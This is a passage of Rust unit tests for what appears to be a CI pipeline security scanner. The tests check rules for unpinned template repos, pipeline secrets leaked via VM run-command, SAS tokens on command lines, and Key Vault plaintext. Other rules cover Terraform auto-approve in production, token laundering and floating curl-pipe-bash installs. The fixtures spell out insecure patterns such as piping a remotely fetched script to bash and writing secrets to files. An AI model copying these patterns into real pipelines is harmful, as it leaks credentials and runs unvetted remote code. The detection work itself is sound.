        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("mutable branch 'main'"));
    }

    #[test]
    fn template_extends_unpinned_branch_skips_tag_pinned() {
        let g = graph_with_repo(
            "templates",
            "github",
            "org/templates",
            Some("refs/tags/v1.0.0"),
            true,
        );
        let findings = template_extends_unpinned_branch(&g);
        assert!(
            findings.is_empty(),
            "refs/tags/v1.0.0 must be treated as pinned"
        );
    }

    #[test]
    fn template_extends_unpinned_branch_skips_sha_pinned() {
        let sha = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0";
        assert_eq!(sha.len(), 40);
        let g = graph_with_repo("templates", "git", "org/templates", Some(sha), true);
        let findings = template_extends_unpinned_branch(&g);
        assert!(
            findings.is_empty(),
            "40-char hex SHA must be treated as pinned"
        );
    }

    #[test]
    fn template_extends_unpinned_branch_skips_unreferenced_repo_with_no_ref() {
        // Spec edge: "repo declared but not referenced anywhere → does not fire
        // (no consumer = no risk)". Applies when the declaration carries no
        // explicit `ref:` field — the entry is purely vestigial in that case.
        let g = graph_with_repo(
            "templates",
            "git",
            "org/templates",
            None,  // no explicit ref
            false, // and no consumer
        );
        let findings = template_extends_unpinned_branch(&g);
        assert!(
            findings.is_empty(),
            "repo declared with no ref and no consumer must not fire"
        );
    }

    #[test]
    fn template_extends_unpinned_branch_fires_on_explicit_branch_even_without_in_file_consumer() {
        // An explicit `ref: refs/heads/<branch>` signals intent to consume —
        // the consumer is typically inside an included template file outside
        // the per-file scan boundary (mirrors the msigeurope corpus shape).
        let g = graph_with_repo(
            "adf_publish",
            "git",
            "org/finance-reporting",
            Some("refs/heads/adf_publish"),
            false, // no in-file consumer
        );
        let findings = template_extends_unpinned_branch(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("mutable branch 'adf_publish'"));
    }

    #[test]
    fn template_extends_unpinned_branch_skips_when_metadata_absent() {
        let g = AuthorityGraph::new(source("ci.yml"));
        assert!(template_extends_unpinned_branch(&g).is_empty());
    }

    #[test]
    fn template_extends_unpinned_branch_handles_bare_branch_name() {
        // `ref: main` (no `refs/heads/` prefix) is a valid ADO shorthand for a branch.
        let g = graph_with_repo(
            "template-library",
            "git",
            "Template Library/Library",
            Some("main"),
            true,
        );
        let findings = template_extends_unpinned_branch(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("mutable branch 'main'"));
    }

    // ── template_repo_ref_is_feature_branch ───────────────────

    #[test]
    fn template_repo_ref_is_feature_branch_fires_on_bare_feature_branch() {
        // Mirrors the corpus shape: `ref: feature/maps-network` (no
        // `refs/heads/` prefix) on the Template Library checkout.
        let g = graph_with_repo(
            "templateLibRepo",
            "git",
            "Template Library/Template Library",
            Some("feature/maps-network"),
            true,
        );
        let findings = template_repo_ref_is_feature_branch(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::TemplateRepoRefIsFeatureBranch
        );
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].message.contains("feature/maps-network"));
        assert!(findings[0].message.contains("feature-class"));
    }

    #[test]
    fn template_repo_ref_is_feature_branch_fires_on_refs_heads_feature() {
        // Same attack via the fully-qualified `refs/heads/feature/...` form.
        let g = graph_with_repo(
            "templates",
            "git",
            "org/templates",
            Some("refs/heads/feature/wip"),
            true,
        );
        let findings = template_repo_ref_is_feature_branch(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("feature/wip"));
    }

    #[test]
    fn template_repo_ref_is_feature_branch_fires_on_develop_branch() {
        // `develop` is not in the trunk set — it's a feature-class branch.
        let g = graph_with_repo(
            "templates",
            "git",
            "org/templates",
            Some("refs/heads/develop"),
            true,
        );
        let findings = template_repo_ref_is_feature_branch(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn template_repo_ref_is_feature_branch_skips_main_branch() {
        // `template_extends_unpinned_branch` still fires on this — but the
        // feature-branch refinement does not, because main is the trunk.
        let g = graph_with_repo(
            "templates",
            "git",
            "org/templates",
            Some("refs/heads/main"),
            true,
        );
        assert!(template_repo_ref_is_feature_branch(&g).is_empty());
        // Sanity: the parent rule still fires on the same input.
        assert_eq!(template_extends_unpinned_branch(&g).len(), 1);
    }

    #[test]
    fn template_repo_ref_is_feature_branch_skips_master_release_hotfix() {
        for ref_value in [
            "master",
            "refs/heads/master",
            "release/v1.4",
            "refs/heads/release/2026-q2",
            "releases/2026-04",
            "hotfix/CVE-2026-0001",
            "refs/heads/hotfix/CVE-2026-0002",
        ] {
            let g = graph_with_repo("t", "git", "org/t", Some(ref_value), true);
            assert!(
                template_repo_ref_is_feature_branch(&g).is_empty(),
                "ref {ref_value:?} must not fire as feature-class"
            );
        }
    }

    #[test]
    fn template_repo_ref_is_feature_branch_skips_pinned_refs() {
        // SHA, tag, and refs/heads/<sha> are all pinned — the feature-branch
        // rule must not fire on any of them, regardless of the alias name.
        let sha = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0";
        for ref_value in [
            sha.to_string(),
            "refs/tags/v1.4.2".to_string(),
            format!("refs/heads/{sha}"),
        ] {
            let g = graph_with_repo("templates", "git", "org/t", Some(&ref_value), true);
            assert!(
                template_repo_ref_is_feature_branch(&g).is_empty(),
                "pinned ref {ref_value:?} must not fire"
            );
        }
    }

    #[test]
    fn template_repo_ref_is_feature_branch_skips_when_ref_absent() {
        // The "no ref:" (default-branch) case is left to
        // `template_extends_unpinned_branch`. The feature-branch rule only
        // fires on explicit feature-class refs.
        let g = graph_with_repo("templates", "git", "org/templates", None, true);
        assert!(template_repo_ref_is_feature_branch(&g).is_empty());
    }

    #[test]
    fn template_repo_ref_is_feature_branch_cofires_with_parent_rule() {
        // Both rules should fire together on the corpus shape — the parent
        // says "not pinned", the refinement says "and it's a feature branch".
        let g = graph_with_repo(
            "templateLibRepo",
            "git",
            "Template Library/Template Library",
            Some("feature/maps-network"),
            true,
        );
        let parent = template_extends_unpinned_branch(&g);
        let refinement = template_repo_ref_is_feature_branch(&g);
        assert_eq!(parent.len(), 1, "parent rule must still fire");
        assert_eq!(refinement.len(), 1, "refinement must fire alongside");
        assert_ne!(parent[0].category, refinement[0].category);
    }

    #[test]
    fn is_feature_class_branch_classification() {
        // Trunk-class — must return false.
        for b in [
            "main",
            "MAIN",
            "master",
            "refs/heads/main",
            "release/v1",
            "release/",
            "release",
            "releases/2026",
            "hotfix/x",
            "hotfix",
            "hotfixes/y",
            "  refs/heads/main  ",
        ] {
            assert!(!is_feature_class_branch(b), "{b:?} must be trunk");
        }
        // Feature-class — must return true.
        for b in [
            "feature/foo",
            "topic/bar",
            "dev/wip",
            "wip/x",
            "develop",
            "users/alice/spike",
            "personal-branch",
            "refs/heads/feature/x",
            "main-staging", // not exact main, prefix-only — feature-class
        ] {
            assert!(is_feature_class_branch(b), "{b:?} must be feature-class");
        }
        // Empty / whitespace.
        assert!(!is_feature_class_branch(""));
        assert!(!is_feature_class_branch("   "));
    }

    #[test]
    fn template_extends_unpinned_branch_skips_refs_heads_with_sha() {
        // ADO accepts `ref: refs/heads/<sha>` to lock onto a commit on a branch.
        // The trailing segment is what determines mutability.
        let sha = "0123456789abcdef0123456789abcdef01234567";
        let g = graph_with_repo(
            "templates",
            "git",
            "org/templates",
            Some(&format!("refs/heads/{sha}")),
            true,
        );
        let findings = template_extends_unpinned_branch(&g);
        assert!(findings.is_empty());
    }

    // ── vm_remote_exec_via_pipeline_secret ──────────────

    #[test]
    fn vm_remote_exec_fires_on_set_azvmextension_with_minted_sas() {
        let body = r#"
            $sastokenpackages = New-AzStorageContainerSASToken -Container $packagecontainer -Context $ctx -Permission r -ExpiryTime (Get-Date).AddHours(3)
            Set-AzVMExtension -ResourceGroupName $vmRG -VMName $vm.name -Name 'customScript' `
                -Publisher 'Microsoft.Compute' -ExtensionType 'CustomScriptExtension' `
                -Settings @{ "commandToExecute" = "powershell -File install.ps1 -saskey `"$sastokenpackages`"" }
        "#;
        let g = graph_with_script_step(body, None);
        let findings = vm_remote_exec_via_pipeline_secret(&g);
        assert_eq!(findings.len(), 1, "should fire once");
        assert_eq!(
            findings[0].category,
            FindingCategory::VmRemoteExecViaPipelineSecret
        );
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn vm_remote_exec_fires_on_invoke_azvmruncommand_with_pipeline_secret() {
        let body = r#"
            Invoke-AzVMRunCommand -ResourceGroupName rg -VMName vm `
                -CommandId RunPowerShellScript -ScriptString "Add-LocalGroupMember -Member admin -Password $(DOMAIN_JOIN_PASSWORD)"
        "#;
        let g = graph_with_script_step(body, Some("DOMAIN_JOIN_PASSWORD"));
        let findings = vm_remote_exec_via_pipeline_secret(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .message
            .contains("interpolating a pipeline secret"));
    }

    #[test]
    fn vm_remote_exec_does_not_fire_without_remote_exec_call() {
        // Has a SAS mint, but no VM remote-exec primitive — should not fire.
        let body = r#"
            $sas = New-AzStorageContainerSASToken -Container c -Context $ctx -Permission r -ExpiryTime (Get-Date).AddHours(1)
            Write-Host "sas length is $($sas.Length)"
        "#;
        let g = graph_with_script_step(body, None);
        let findings = vm_remote_exec_via_pipeline_secret(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn vm_remote_exec_does_not_fire_when_remote_exec_has_no_secret_or_sas() {
        // Set-AzVMExtension with a static command line, no SAS, no secret —
        // should not fire (no exposed credential).
        let body = r#"
            Set-AzVMExtension -ResourceGroupName rg -VMName vm -Name diag `
                -Publisher Microsoft.Azure.Diagnostics -ExtensionType IaaSDiagnostics `
                -Settings @{ "xmlCfg" = "<wadcfg/>" }
        "#;
        let g = graph_with_script_step(body, None);
        let findings = vm_remote_exec_via_pipeline_secret(&g);
        assert!(
            findings.is_empty(),
            "no SAS-mint and no secret interpolation → no finding"
        );
    }

    #[test]
    fn vm_remote_exec_fires_on_az_cli_run_command() {
        let body = r#"
            az vm run-command invoke --resource-group rg --name vm `
                --command-id RunShellScript --scripts "echo $(DB_PASSWORD) > /tmp/x"
        "#;
        let g = graph_with_script_step(body, Some("DB_PASSWORD"));
        let findings = vm_remote_exec_via_pipeline_secret(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("az vm run-command"));
    }

    // ── short_lived_sas_in_command_line ─────────────────

    #[test]
    fn sas_in_cmdline_fires_on_minted_sas_interpolated_into_command_to_execute() {
        let body = r#"
            $sastokenpackages = New-AzStorageContainerSASToken -Container c -Context $ctx -Permission r -ExpiryTime (Get-Date).AddHours(3)
            $settings = @{ "commandToExecute" = "powershell install.ps1 -sas `"$sastokenpackages`"" }
        "#;
        let g = graph_with_script_step(body, None);
        let findings = short_lived_sas_in_command_line(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::ShortLivedSasInCommandLine
        );
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0].message.contains("sastokenpackages"));
    }

    #[test]
    fn sas_in_cmdline_does_not_fire_when_sas_is_only_uploaded_to_blob() {
        // SAS minted but never put on argv — only used to build a URL.
        let body = r#"
            $sas = New-AzStorageContainerSASToken -Container c -Context $ctx -Permission r -ExpiryTime (Get-Date).AddHours(1)
            $url = "https://acct.blob.core.windows.net/c/?" + $sas
            Invoke-WebRequest -Uri $url -OutFile foo.zip
        "#;
        let g = graph_with_script_step(body, None);
        let findings = short_lived_sas_in_command_line(&g);
        assert!(findings.is_empty(), "no command-line sink → no finding");
    }

    #[test]
    fn sas_in_cmdline_does_not_fire_without_sas_mint() {
        let body = r#"
            $settings = @{ "commandToExecute" = "powershell -File foo.ps1" }
        "#;
        let g = graph_with_script_step(body, None);
        let findings = short_lived_sas_in_command_line(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn sas_in_cmdline_fires_on_az_cli_generate_sas_with_arguments() {
        let body = r#"
            sas=$(az storage container generate-sas --name c --account-name acct --permissions r --expiry 2099-01-01 -o tsv)
            az vm extension set --vm-name vm --resource-group rg --name CustomScript --publisher Microsoft.Compute \
                --settings "{ \"commandToExecute\": \"curl https://acct.blob.core.windows.net/c/foo?$sas\" }"
        "#;
        let g = graph_with_script_step(body, None);
        let findings = short_lived_sas_in_command_line(&g);
        // mint + sink in same script → fires (fallback evidence path).
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn co_fire_on_solarwinds_pattern() {
        // Mirrors the corpus solarwinds shape: SAS minted, embedded in
        // CustomScriptExtension commandToExecute. Both rules must fire.
        let body = r#"
            $sastokenpackages = New-AzStorageContainerSASToken -Container $pc -Context $ctx -Permission r -ExpiryTime (Get-Date).AddHours(3)
            Set-AzVMExtension -ResourceGroupName $rg -VMName $vm `
                -Publisher 'Microsoft.Compute' -ExtensionType 'CustomScriptExtension' `
                -Settings @{ "commandToExecute" = "powershell -File install.ps1 -sas `"$sastokenpackages`"" }
        "#;
        let g = graph_with_script_step(body, None);
        let r6 = vm_remote_exec_via_pipeline_secret(&g);
        let r7 = short_lived_sas_in_command_line(&g);
        assert_eq!(r6.len(), 1, "rule 6 must fire on solarwinds shape");
        assert_eq!(r7.len(), 1, "rule 7 must fire on solarwinds shape");
    }

    #[test]
    fn body_interpolates_var_does_not_match_prefix() {
        // `$sas` should not match `$sastokenpackages`.
        assert!(!body_interpolates_var(
            "Write-Host $sastokenpackages",
            "sas"
        ));
        assert!(body_interpolates_var(
            "Write-Host $sastokenpackages",
            "sastokenpackages"
        ));
        assert!(body_interpolates_var("echo $(SECRET)", "SECRET"));
    }

    #[test]
    fn powershell_sas_assignments_extracts_var_names() {
        let body = r#"
            $a = New-AzStorageContainerSASToken -Container c -Context $ctx -Permission r
            $b = Get-Date
            $sasBlob = New-AzStorageBlobSASToken -Container c -Blob foo -Context $ctx -Permission r
        "#;
        let names = powershell_sas_assignments(body);
        assert!(names.iter().any(|n| n.eq_ignore_ascii_case("a")));
        assert!(names.iter().any(|n| n.eq_ignore_ascii_case("sasBlob")));
        assert!(!names.iter().any(|n| n.eq_ignore_ascii_case("b")));
    }

    #[test]
    fn bash_export_of_pipeline_secret_flagged() {
        let g = build_step_with_script(
            "TF_TOKEN",
            "echo init\nexport TF_TOKEN_app_terraform_io=\"$(TF_TOKEN)\"\nterraform init",
        );
        let findings = secret_to_inline_script_env_export(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].message.contains("$(TF_TOKEN)"));
    }

    #[test]
    fn powershell_assignment_of_pipeline_secret_flagged() {
        let g = build_step_with_script(
            "AppContainerDBPassword",
            "$AppContainerDBPassword = \"$(AppContainerDBPassword)\"\n$x = 1",
        );
        let findings = secret_to_inline_script_env_export(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("$(AppContainerDBPassword)"));
    }

    #[test]
    fn secret_passed_as_command_argument_not_flagged() {
        // Secret used as a CLI argument, not assigned to a variable. This is
        // covered by the separate META_CLI_FLAG_EXPOSED detection — env_export
        // should NOT also fire here.
        let g = build_step_with_script("TF_TOKEN", "terraform plan -var \"token=$(TF_TOKEN)\"");
        let findings = secret_to_inline_script_env_export(&g);
        assert!(
            findings.is_empty(),
            "command-arg use of $(SECRET) must not trip env-export rule"
        );
    }

    #[test]
    fn step_without_script_body_not_flagged() {
        let mut g = AuthorityGraph::new(source("ado.yml"));
        let secret = g.add_node(NodeKind::Secret, "TF_TOKEN", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "task", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);
        let findings = secret_to_inline_script_env_export(&g);
        assert!(findings.is_empty());
    }

    // ── secret_materialised_to_workspace_file ────────────────

    #[test]
    fn powershell_outfile_of_secret_to_workspace_flagged() {
        // Mirrors Azure_Landing_Zone/userapp-n8nx pattern: secret bound to
        // $var, then $var written via Out-File to $(System.DefaultWorkingDirectory).
        let script = "$AppContainerDBPassword = \"$(AppContainerDBPassword)\"\n\
                      $TFfile = Get-Content $(System.DefaultWorkingDirectory)/in.tfvars\n\
                      $TFfile = $TFfile.Replace(\"x\", $AppContainerDBPassword)\n\
                      $TFfile | Out-File $(System.DefaultWorkingDirectory)/envVars/tffile.tfvars";
        let g = build_step_with_script("AppContainerDBPassword", script);
        let findings = secret_materialised_to_workspace_file(&g);
        assert_eq!(
            findings.len(),
            1,
            "Out-File of bound secret to workspace must fire"
        );
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn bash_redirect_of_secret_to_tfvars_flagged() {
        let script =
            "echo \"token = \\\"$(TF_TOKEN)\\\"\" > $(Build.SourcesDirectory)/secrets.tfvars";
        let g = build_step_with_script("TF_TOKEN", script);
        let findings = secret_materialised_to_workspace_file(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn echoing_secret_to_stdout_not_flagged_by_materialisation_rule() {
        let g = build_step_with_script("TF_TOKEN", "echo using $(TF_TOKEN)\nterraform init");
        let findings = secret_materialised_to_workspace_file(&g);
        assert!(
            findings.is_empty(),
            "stdout echo (no file sink) must not trip materialisation rule"
        );
    }

    #[test]
    fn write_to_unrelated_path_not_flagged() {
        // No workspace-path keyword, no risky extension — should not fire.
        let script = "echo $(MY_SECRET) > /var/tmp/ignore.log";
        let g = build_step_with_script("MY_SECRET", script);
        let findings = secret_materialised_to_workspace_file(&g);
        assert!(findings.is_empty());
    }

    // ── keyvault_secret_to_plaintext ─────────────────────────

    #[test]
    fn keyvault_asplaintext_flagged() {
        let script = "$pass = Get-AzKeyVaultSecret -VaultName foo -Name bar -AsPlainText\n\
                      Write-Host done";
        let g = build_step_with_script("UNUSED", script);
        let findings = keyvault_secret_to_plaintext(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
    }

    #[test]
    fn keyvault_secretvaluetext_legacy_pattern_flagged() {
        let script = "$pwd = (Get-AzKeyVaultSecret -VaultName foo -Name bar).SecretValueText";
        let g = build_step_with_script("UNUSED", script);
        let findings = keyvault_secret_to_plaintext(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn convertfrom_securestring_asplaintext_flagged() {
        let script = "$plain = ConvertFrom-SecureString $sec -AsPlainText";
        let g = build_step_with_script("UNUSED", script);
        let findings = keyvault_secret_to_plaintext(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn keyvault_securestring_handling_not_flagged() {
        // Using the secret as SecureString (no -AsPlainText) is the safe pattern.
        let script = "$sec = Get-AzKeyVaultSecret -VaultName foo -Name bar\n\
                      $cred = New-Object PSCredential 'svc', $sec.SecretValue";
        let g = build_step_with_script("UNUSED", script);
        let findings = keyvault_secret_to_plaintext(&g);
        assert!(
            findings.is_empty(),
            "SecureString-only handling is the recommended pattern and must not fire"
        );
    }

    // ── terraform_auto_approve_in_prod ──────────────────────

    fn step_with_meta(g: &mut AuthorityGraph, name: &str, meta: &[(&str, &str)]) -> NodeId {
        let mut m = std::collections::HashMap::new();
        for (k, v) in meta {
            m.insert((*k).to_string(), (*v).to_string());
        }
        g.add_node_with_metadata(NodeKind::Step, name, TrustZone::FirstParty, m)
    }

    #[test]
    fn terraform_auto_approve_against_prod_connection_fires() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "Terraform : Apply",
            &[
                (META_TERRAFORM_AUTO_APPROVE, "true"),
                (META_SERVICE_CONNECTION_NAME, "sharedservice-w365-prod-sc"),
            ],
        );

        let findings = terraform_auto_approve_in_prod(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(
            findings[0].category,
            FindingCategory::TerraformAutoApproveInProd
        );
        assert!(
            findings[0].message.contains("sharedservice-w365-prod-sc"),
            "message should name the connection, got: {}",
            findings[0].message
        );
    }

    #[test]
    fn terraform_auto_approve_via_edge_to_service_connection_identity() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        let step = step_with_meta(
            &mut g,
            "Terraform : Apply",
            &[(META_TERRAFORM_AUTO_APPROVE, "true")],
        );
        let mut id_meta = std::collections::HashMap::new();
        id_meta.insert(META_SERVICE_CONNECTION.into(), "true".into());
        let conn = g.add_node_with_metadata(
            NodeKind::Identity,
            "alz-infra-sc-prd-uks",
            TrustZone::FirstParty,
            id_meta,
        );
        g.add_edge(step, conn, EdgeKind::HasAccessTo);

        let findings = terraform_auto_approve_in_prod(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("alz-infra-sc-prd-uks"));
    }

    #[test]
    fn terraform_auto_approve_with_env_gate_downgrades_to_medium() {
        // Per blue-team CC-4: env gate is a partial control (the gate's
        // approver list is invisible from YAML), so the finding stays
        // visible at Medium rather than disappearing entirely.
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "Terraform : Apply",
            &[
                (META_TERRAFORM_AUTO_APPROVE, "true"),
                (META_SERVICE_CONNECTION_NAME, "platform-prod-sc"),
                (META_ENV_APPROVAL, "true"),
            ],
        );

        let findings = terraform_auto_approve_in_prod(&g);
        assert_eq!(
            findings.len(),
            1,
            "env-gated apply must still emit a finding"
        );
        assert_eq!(
            findings[0].severity,
            Severity::Medium,
            "env-gated apply downgrades Critical → Medium (compensating control credit)"
        );
        assert!(findings[0]
            .message
            .contains("`environment:` binding present"));
    }

    #[test]
    fn terraform_auto_approve_against_non_prod_does_not_fire() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "Terraform : Apply",
            &[
                (META_TERRAFORM_AUTO_APPROVE, "true"),
                (META_SERVICE_CONNECTION_NAME, "platform-dev-sc"),
            ],
        );

        let findings = terraform_auto_approve_in_prod(&g);
        assert!(findings.is_empty(), "dev connection must not match prod");
    }

    #[test]
    fn terraform_apply_without_auto_approve_does_not_fire() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "Terraform : Apply",
            &[(META_SERVICE_CONNECTION_NAME, "platform-prod-sc")],
        );

        let findings = terraform_auto_approve_in_prod(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn looks_like_prod_connection_matches_real_world_names() {
        assert!(looks_like_prod_connection("sharedservice-w365-prod-sc"));
        assert!(looks_like_prod_connection("alz-infra-sc-prd"));
        assert!(looks_like_prod_connection("prod-tenant-arm"));
        assert!(looks_like_prod_connection("PROD"));
        assert!(looks_like_prod_connection("my_prod_arm"));
        // Negatives — substrings inside other words must not match
        assert!(!looks_like_prod_connection("approver-sc"));
        assert!(!looks_like_prod_connection("reproducer-sc"));
        assert!(!looks_like_prod_connection("dev-sc"));
        assert!(!looks_like_prod_connection("staging"));
    }

    // ── addspn_with_inline_script ───────────────────────────

    #[test]
    fn addspn_with_inline_script_fires_with_basic_body() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "ado : azure : login (federated)",
            &[
                (META_ADD_SPN_TO_ENV, "true"),
                (META_SCRIPT_BODY, "az account show --query id -o tsv"),
            ],
        );

        let findings = addspn_with_inline_script(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(!findings[0]
            .message
            .contains("explicit token laundering detected"));
    }

    #[test]
    fn addspn_with_inline_script_escalates_message_on_token_laundering() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "ado : azure : login (federated)",
            &[
                (META_ADD_SPN_TO_ENV, "true"),
                (
                    META_SCRIPT_BODY,
                    "Write-Output \"##vso[task.setvariable variable=ARM_OIDC_TOKEN]$env:idToken\"",
                ),
            ],
        );

        let findings = addspn_with_inline_script(&g);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .message
                .contains("explicit token laundering detected"),
            "message should escalate, got: {}",
            findings[0].message
        );
    }

    #[test]
    fn addspn_without_inline_script_does_not_fire() {
        // No META_SCRIPT_BODY → scriptPath form, not inline
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "AzureCLI scriptPath",
            &[(META_ADD_SPN_TO_ENV, "true")],
        );

        let findings = addspn_with_inline_script(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn inline_script_without_addspn_does_not_fire() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        step_with_meta(
            &mut g,
            "az account show",
            &[(META_SCRIPT_BODY, "az account show")],
        );

        let findings = addspn_with_inline_script(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn script_launders_spn_token_recognises_known_markers() {
        assert!(script_launders_spn_token(
            "Write-Output \"##vso[task.setvariable variable=ARM_OIDC_TOKEN]$env:idToken\""
        ));
        assert!(script_launders_spn_token(
            "echo \"##vso[task.setvariable variable=X]$env:servicePrincipalKey\""
        ));
        // setvariable without token material → not laundering, just env mutation
        assert!(!script_launders_spn_token(
            "echo \"##vso[task.setvariable variable=X]hello\""
        ));
        // No setvariable at all
        assert!(!script_launders_spn_token("$env:idToken"));
    }

    // ── parameter_interpolation_into_shell ──────────────────

    fn graph_with_param(spec: ParamSpec, name: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.parameters.insert(name.to_string(), spec);
        g
    }

    #[test]
    fn parameter_interpolation_fires_on_free_form_string_in_inline_script() {
        let mut g = graph_with_param(
            ParamSpec {
                param_type: "string".into(),
                has_values_allowlist: false,
            },
            "appName",
        );
        step_with_meta(
            &mut g,
            "terraform workspace",
            &[(
                META_SCRIPT_BODY,
                "terraform workspace select -or-create ${{ parameters.appName }}",
            )],
        );

        let findings = parameter_interpolation_into_shell(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0].message.contains("appName"));
    }

    #[test]
    fn parameter_interpolation_with_values_allowlist_does_not_fire() {
        let mut g = graph_with_param(
            ParamSpec {
                param_type: "string".into(),
                has_values_allowlist: true,
            },
            "location",
        );
        step_with_meta(
            &mut g,
            "Terraform Plan",
            &[(
                META_SCRIPT_BODY,
                "terraform plan -var=\"location=${{ parameters.location }}\"",
            )],
        );

        let findings = parameter_interpolation_into_shell(&g);
        assert!(
            findings.is_empty(),
            "values: allowlist must suppress the finding"
        );
    }

    #[test]
    fn parameter_interpolation_default_type_is_treated_as_string() {
        let mut g = graph_with_param(
            ParamSpec {
                // ADO defaults missing `type:` to string — same risk
                param_type: "".into(),
                has_values_allowlist: false,
            },
            "appName",
        );
        step_with_meta(
            &mut g,
            "Terraform : Plan",
            &[(
                META_SCRIPT_BODY,
                "terraform plan -var \"appName=${{ parameters.appName }}\"",
            )],
        );

        let findings = parameter_interpolation_into_shell(&g);
        assert_eq!(findings.len(), 1, "missing type: must default to string");
    }

    #[test]
    fn parameter_interpolation_skips_non_string_params() {
        let mut g = graph_with_param(
            ParamSpec {
                param_type: "boolean".into(),
                has_values_allowlist: false,
            },
            "enabled",
        );
        step_with_meta(
            &mut g,
            "step",
            &[(META_SCRIPT_BODY, "echo ${{ parameters.enabled }}")],
        );

        let findings = parameter_interpolation_into_shell(&g);
        assert!(findings.is_empty(), "boolean params can't carry shell");
    }

    #[test]
    fn parameter_interpolation_no_spaces_form_also_matches() {
        let mut g = graph_with_param(
            ParamSpec {
                param_type: "string".into(),
                has_values_allowlist: false,
            },
            "x",
        );
        step_with_meta(
            &mut g,
            "step",
            &[(META_SCRIPT_BODY, "echo ${{parameters.x}}")],
        );

        let findings = parameter_interpolation_into_shell(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn parameter_interpolation_skips_step_without_script_body() {
        let mut g = graph_with_param(
            ParamSpec {
                param_type: "string".into(),
                has_values_allowlist: false,
            },
            "appName",
        );
        // Step has no META_SCRIPT_BODY (e.g. a typed task without an inline script)
        g.add_node(NodeKind::Step, "task-step", TrustZone::Untrusted);

        let findings = parameter_interpolation_into_shell(&g);
        assert!(findings.is_empty());
    }

    // ── runtime_script_fetched_from_floating_url ───────────────

    fn step_with_body(body: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let id = g.add_node(NodeKind::Step, "install", TrustZone::FirstParty);
        if let Some(node) = g.nodes.get_mut(id) {
            node.metadata
                .insert(META_SCRIPT_BODY.into(), body.to_string());
        }
        g
    }

    #[test]
    fn floating_curl_pipe_bash_master_is_flagged() {
        let g = step_with_body(
            "curl -fsSL https://raw.githubusercontent.com/tilt-dev/tilt/master/scripts/install.sh | bash",
        );
        let findings = runtime_script_fetched_from_floating_url(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].category,
            FindingCategory::RuntimeScriptFetchedFromFloatingUrl
        );
    }

    #[test]
    fn floating_deno_run_main_is_flagged() {
        let g = step_with_body(
            "deno run https://raw.githubusercontent.com/denoland/deno/refs/heads/main/tools/verify_pr_title.js \"$PR_TITLE\"",
        );
        let findings = runtime_script_fetched_from_floating_url(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn pinned_curl_url_with_tag_not_flagged() {
        let g = step_with_body(
            "curl -fsSL https://raw.githubusercontent.com/tilt-dev/tilt/v0.33.10/scripts/install.sh | bash",
        );
        let findings = runtime_script_fetched_from_floating_url(&g);
        assert!(findings.is_empty(), "tag-pinned URL must not fire");
    }

    #[test]
    fn curl_without_pipe_to_shell_not_flagged() {
        // `curl -O` writes to disk; the script isn't executed inline.
        let g = step_with_body(
            "curl -sSLO https://raw.githubusercontent.com/rust-lang/rust/master/src/tools/linkchecker/linkcheck.sh",
        );
        let findings = runtime_script_fetched_from_floating_url(&g);
        assert!(findings.is_empty(), "download-only must not fire");
    }

    #[test]
